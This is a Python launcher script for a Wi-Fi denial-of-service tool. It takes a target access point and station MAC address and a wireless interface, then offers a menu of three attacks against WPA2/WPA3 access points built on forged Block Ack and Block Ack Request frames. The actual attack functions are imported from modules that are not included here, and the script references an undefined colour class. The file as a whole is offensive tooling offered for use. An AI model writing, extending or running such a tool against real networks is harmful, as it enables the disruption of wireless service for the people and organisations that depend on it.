import sys
import os
import re
import subprocess
from exploits.BA import BA_exploit
from exploits.BAR import BAR_exploit
from exploits.BAR_SC import BAR_SC_exploit

if len(sys.argv) > 4:
    print("Too many arguments")
    os._exit(0)


def is_valid(str):
  regex = ("^([0-9A-Fa-f]{2}[:-])" +"{5}([0-9A-Fa-f]{2})|" +"([0-9a-fA-F]{4}\\." +"[0-9a-fA-F]{4}\\." +"[0-9a-fA-F]{4})$")
  match = re.compile(regex)
  if (str == None):
    return False
  if(re.search(match, str)):
    return True
  else:
    return False
    
if not (is_valid(sys.argv[1])):
    print("AP address is not a valid MAC address")
    os._exit(0)
elif not (is_valid(sys.argv[2])):
    print("STA address is not a valid MAC address")
    os._exit(0)

targeted_AP = sys.argv[1]
targeted_STA = sys.argv[2]

#check if WNIC is alive
#sa = subprocess.check_output(['iw dev'], shell=True)
#print(sa)
WNIC = sys.argv[3]


subprocess.call(['clear'], shell=True)
print('''


  ____  _  ___       _    
 | __ )| |/ _ \  ___| | __                    __
 |  _ \| | | | |/ __| |/ /                  .'  '.
 | |_) | | |_| | (__|   <                  | STOP |
 |____/|_|\___/ \___|_|\_\                  '.__.'
                                              ||
                                              ||
                                              ||
                                            \\||///
                                         ^^^^^^^^^^^^^

''')
print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n')
print('\t\tThis tool is capable of launching 3 different DoS attacks against any WPA2 or WPA3 certified AP. \n\t\tIt utilizes two control frames, namely the Block Ack (BA) and Block Ack Request (BAR) control frames.\n\t\tConsidering the BAR attack there are two possible options, one with a random SN and on with a valid SN.\n')
print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n')
                            
print('1) BA attack with random SN')
print('2) BAR attack with random SN')
print('3) BAR attack with valid SN')

try:
    choice = int(input('Enter a choice: '))
except:
    print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
    os._exit(0)
if choice == 1:
    BA_exploit(targeted_AP, targeted_STA, WNIC)
elif choice == 2:
    BAR_exploit(targeted_AP, targeted_STA, WNIC)
elif choice == 3:
    BAR_SC_exploit(targeted_AP, targeted_STA, WNIC)
else:
    print('\nNo such choice :(')
